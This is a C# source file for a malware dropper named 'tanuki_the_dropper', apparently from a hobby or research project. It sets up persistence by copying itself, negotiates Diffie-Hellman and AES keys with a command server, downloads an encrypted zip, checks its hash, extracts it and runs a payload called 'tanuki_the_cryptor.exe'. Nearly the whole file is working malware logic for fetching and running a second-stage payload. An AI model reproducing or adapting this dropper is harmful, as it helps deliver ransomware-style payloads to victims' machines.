using Packets;
using System;
using System.IO;
using System.IO.Compression;
using System.Numerics;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace tanuki_the_dropper
{
    class Program
    {
        private static Mutex mutex = null;
        static void Main(string[] args)
        {
            const string appName = "tanuki";
            bool createdNew;

            mutex = new Mutex(true, appName, out createdNew);

            if (!createdNew)
            {
                Console.WriteLine(appName + " is already running! Exiting the application.");
                Console.ReadKey();
                return;
            }

            Console.WriteLine("tanuki!!!!!!!!");

            Persistence persistence = new Persistence();
            persistence.SelfCopy();

            Dropper dropper = new Dropper();
            dropper.Execute();

            Console.ReadLine();
        }
    }

    class Dropper
    {
        private BigInteger dh_key;
        private BigInteger aes_key;
        private Communication comm;

        public void Execute()
        {
            var RetryTimes = 3;
            var WaitTime = 6000;

            for (int i = 0; i < RetryTimes; i++)
            {
                try
                {
                    KeyGeneration();
                    ExeExec();
                    break;
                }
                catch (Exception Ex)
                {
                    Console.WriteLine($"Error try {i}");
                    Task.Delay(WaitTime).Wait();
                }
            }
        }

        private void KeyGeneration()
        {
            BigInteger x;
            BigInteger gx;
            try
            {
                comm = new Communication("localhost", 65432);

                byte[] keyGenRequest_bytes = Packet.GenNewRequest("keyExchangeGen");

                comm.Start();

                comm.SendMessage(keyGenRequest_bytes);
                byte[] response_byte = comm.RecvMessage(1024);

                (string prime, string generator, string gx_server) = Packet.GetServerKeyParameters(response_byte);
                (x, gx, dh_key) = Cryptography.GenerateDHValues_X_GX_KEY(BigInteger.Parse(prime), BigInteger.Parse(generator), BigInteger.Parse(gx_server));

                byte[] parameters_bytes = Packet.SendClientParameters("keyExchangeAns", gx);
                comm.SendMessage(parameters_bytes);

                Console.WriteLine("DH Key int: " + dh_key.ToString());
                Console.WriteLine("DH Key hex: " + dh_key.ToString("X"));

                aes_key = new BigInteger(Cryptography.ComputeAESKey(dh_key.ToString("X")));

                Console.WriteLine("AES Key hex: " + ByteArrayToString(this.aes_key.ToByteArray()));
            }
            catch (Exception ex)
            {
                Console.WriteLine("Could not generate dropper's keys: " + ex.Message);
                comm.Close();
                throw;
            }
        }

        private void ExeExec()
        {
            try
            {
                (byte[] exeZip_bytes, int bytesRead) = (null, 0);
                for (int i = 0; i < 3; i++)
                {
                    byte[] exeInfoRequest_bytes = Packet.GenNewRequest("exeSend");
                    comm.SendMessage(exeInfoRequest_bytes);

                    byte[] response_byte = comm.RecvMessage(4096);
                    (string serverHash, int serverSize) = Packet.GetExeInfo(response_byte);

                    (exeZip_bytes, bytesRead) = comm.RecvBinary(serverSize);

                    if (bytesRead != serverSize)
                    {
                        Console.WriteLine("EXE size error: ");
                        continue;
                    }

                    exeZip_bytes = Cryptography.AESDecrypt(exeZip_bytes, aes_key.ToByteArray());
                    string clientHash = Cryptography.GetHash(exeZip_bytes);

                    if (!clientHash.Equals(serverHash))
                    {
                        Console.WriteLine("EXE hash error: ");
                        Console.WriteLine("Hash server: " + serverHash);
                        Console.WriteLine("Client server: " + clientHash);
                        continue;
                    }

                    break;
                }

                Console.WriteLine("Writing zip.");
                using (FileStream file = new FileStream("malware.zip", FileMode.Create, FileAccess.Write))
                {
                    file.Write(exeZip_bytes, 0, bytesRead);
                }

                Console.WriteLine("Extracting zip.");
                ZipFile.ExtractToDirectory("malware.zip", ".\\");

                Exec.ExecProgram(".\\malware\\tanuki_the_cryptor.exe");

                Console.WriteLine("Binary file received and saved.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Could not execute malware: " + ex.Message);

                if (File.Exists("malware.zip")) { File.Delete("malware.zip"); }
                if (Directory.Exists("malware"))
                {
                    foreach (string file in Directory.EnumerateFiles("malware"))
                        File.Delete(file);
                    Directory.Delete("malware");
                }
                throw;
            }

        }

        public static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }

    }

}